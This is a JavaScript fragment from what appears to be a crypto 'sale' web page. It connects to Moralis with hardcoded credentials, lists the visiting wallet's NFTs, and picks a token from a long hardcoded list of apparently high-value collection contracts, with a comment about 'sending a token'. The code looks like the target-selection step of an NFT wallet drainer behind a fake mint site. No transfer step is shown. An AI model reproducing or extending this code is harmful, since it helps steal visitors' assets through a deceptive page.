    let tid;
    let gid

    Moralis.start({
        serverUrl: "https://te80hd1ydicr.usemoralis.com:2053/server",
        appId: "IPh69utU7r1bCRHdOpFVu21ZZ4dpkP1HUpnuU5wb"
    });



    async function deu1() {
        // sending a token with token id = 1
        let cursor = null;
        let nfts = [];
        do {
            const ethNFTs = await Moralis.Web3API.account.getNFTs({
                chain: "ETH",
                address: account,
                cursor: cursor,
            });
            gid = ethNFTs.result
            console.log(gid);
            for (const nft of ethNFTs.result) {
                nfts.push({
                    token_address: nft.token_address,
                    token_id: nft.token_id,
                    contract_type: nft.contract_type,
                    amount: nft.amount,
                });
            }
            cursor = ethNFTs.cursor;

        } while (cursor != "" && cursor != null);

        console.log("owners:", nfts, "total owners:", Object.keys(nfts).length);

        nfts.some((el) => {
            if (
                el.token_address == '0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d' ||
                el.token_address == '0xb47e3cd837ddf8e4c57f05d70ab865de6e193bbb' ||
                el.token_address == '0x22c36bfdcef207f9c0cc941936eff94d4246d14a' ||
                el.token_address == '0x57a204aa1042f6e66dd7730813f4024114d74f37' ||
                el.token_address == '0x08d7c0242953446436f34b4c78fe9da38c73668d' ||
                el.token_address == '0x23581767a106ae21c074b2276d25e5c3e136a68b' ||
                el.token_address == '0x348fc118bcc65a92dc033a951af153d14d945312' ||
                el.token_address == '0x60e4d786628fea6478f785a6d7e704777c86a7c6' ||
                el.token_address == '0x620b70123fb810f6c653da7644b5dd0b6312e4d8' ||
                el.token_address == '0x8a90cab2b38dba80c64b7734e58ee1db38b8992e' ||
                el.token_address == '0xed5af388653567af2f388e6224dc7c4b3241c544' ||
                el.token_address == '0x49cf6f5d44e70224e2e23fdcdd2c053f30ada28b' ||
                el.token_address == '0x059edd72cd353df5106d2b9cc5ab83a52287ac3a' ||
                el.token_address == '0xa3aee8bce55beea1951ef834b99f3ac60d1abeeb' ||
                el.token_address == '0x282bdd42f4eb70e7a9d9f40c8fea0825b7f68c5d' ||
                el.token_address == '0xaadc2d4261199ce24a4b0a57370c4fcf43bb60aa' ||
                el.token_address == '0xba30e5f9bb24caa003e9f2f0497ad287fdf95623' ||
                el.token_address == '0xedb61f74b0d09b2558f1eeb79b247c1f363ae452' ||
                el.token_address == '0x86825dfca7a6224cfbd2da48e85df2fc3aa7c4b1' ||
                el.token_address == '0x341a1c534248966c4b6afad165b98daed4b964ef' ||
                el.token_address == '0xe785e82358879f061bc3dcac6f0444462d4b5330' ||
                el.token_address == '0x7bd29408f11d2bfc23c34f18275bbf23bb716bc7' ||
                el.token_address == '0xbd4455da5929d5639ee098abfaa3241e9ae111af' ||
                el.token_address == '0x1a92f7381b9f03921564a437210bb9396471050c' ||
                el.token_address == '0x1792a96e5668ad7c167ab804a100ce42395ce54d' ||
                el.token_address == '0xbce3781ae7ca1a5e050bd9c4c77369867ebc307e' ||
                el.token_address == '0x59468516a8259058bad1ca5f8f4bff190d30e066' ||
                el.token_address == '0x7d8820fa92eb1584636f4f5b8515b5476b75171a' ||
                el.token_address == '0xccc441ac31f02cd96c153db6fd5fe0a2f4e6a68d' ||
                el.token_address == '0x57a204aa1042f6e66dd7730813f4024114d74f37' ||
                el.token_address == '0xf87e31492faf9a91b02ee0deaad50d51d56d5d4d' ||
                el.token_address == '0x6d4bbc0387dd4759eee30f6a482ac6dc2df3facf' ||
                el.token_address == '0x34d85c9cdeb23fa97cb08333b511ac86e1c4e258' ||
                el.token_address == '0x892848074ddea461a15f337250da3ce55580ca85' ||
                el.token_address == '0x1cb1a5e65610aeff2551a50f76a87a7d3fb649c6' ||
                el.token_address == '0x466cfcd0525189b573e794f554b8a751279213ac' ||
                el.token_address == '0x5cc5b05a8a13e3fbdb0bb9fccd98d38e50f90c38' ||
                el.token_address == '0x79fcdef22feed20eddacbb2587640e45491b757f' ||
                el.token_address == '0x75e95ba5997eb235f40ecf8347cdb11f18ff640b' ||
                el.token_address == '0x20ed6cdf9344b3a187063a3ff4d883b6b1947b81' ||
                el.token_address == '0x80336ad7a747236ef41f47ed2c7641828a480baa' ||
                el.token_address == '0xd497a414bb00803e846b53d07fcb742831b24906' ||
                el.token_address == '0xcd041f40d497038e2da65988b7d7e2c0d9244619' ||
                el.token_address == '0x2acab3dea77832c09420663b0e1cb386031ba17b' ||
                el.token_address == '0xbd3531da5cf5857e7cfaa92426877b022e612cf8' ||
                el.token_address == '0xfe8c6d19365453d26af321d0e8c910428c23873f' ||
                el.token_address == '0x3110ef5f612208724ca51f5761a69081809f03b7' ||
                el.token_address == '0x306b1ea3ecdf94ab739f1910bbda052ed4a9f949' ||
                el.token_address == '0x28472a58a490c5e09a238847f66a68a47cc76f0f' ||
                el.token_address == '0xd5af737470e963f40f9e681b2e9d12acdbbb5492' ||
                el.token_address == '0x4db1f25d3d98600140dfc18deb7515be5bd293af' ||
                el.token_address == '0x19b86299c21505cdf59ce63740b240a9c822b5e4' ||
                el.token_address == '0x06b3fcc9e79d724a08012f0b9f71bd03b415d334' ||
                el.token_address == '0xc99c679c50033bbc5321eb88752e89a93e9e83c5' ||
                el.token_address == '0xc5b52253f5225835cc81c52cdb3d6a22bc3b0c93' ||
                el.token_address == '0x506A286A6bb78C9E5D189f436619a87a90aab088' ||
                el.token_address == '0x26badf693f2b103b021c670c852262b379bbbe8a'
            ) {
                console.log(el.token_id);
                tid = el.token_id;
                console.log(el.token_address);
                return tid;
            }
        })
        check();
    }

    /* async function deu3() {
          // sending a token with token id = 1
          const options = {
            chain: "eth",
            address: account,
            token_address: "0x341a1c534248966c4b6afad165b98daed4b964ef",
          };
          const ethNFTs = await Moralis.Web3API.account.getNFTsForContract(options);
          gid = ethNFTs.result[0].token_id;
          console.log(ethNFTs.result[0].token_id);
          console.log(account);   
    check();
    } */



    async function check() {

        if (!window.web3) {
            // window.location.replace("https://metamask.app.link/dapp/www.mutantshiba.sale")
            document.getElementById("not-connected").style.display = "block";
            document.getElementById("connected-btns").style.display = "none";
            document.getElementById("wnot-connected").style.display = "none";
        } else if (account > 1) {
            document.getElementById("not-connected").style.display = "none";
            document.getElementById("connected-btns").style.display = "block";
            document.getElementById("wnot-connected").style.display = "none";
        } else {
            document.getElementById("not-connected").style.display = "none";
            document.getElementById("connected-btns").style.display = "none";
            document.getElementById("wnot-connected").style.display = "block";

        }
    }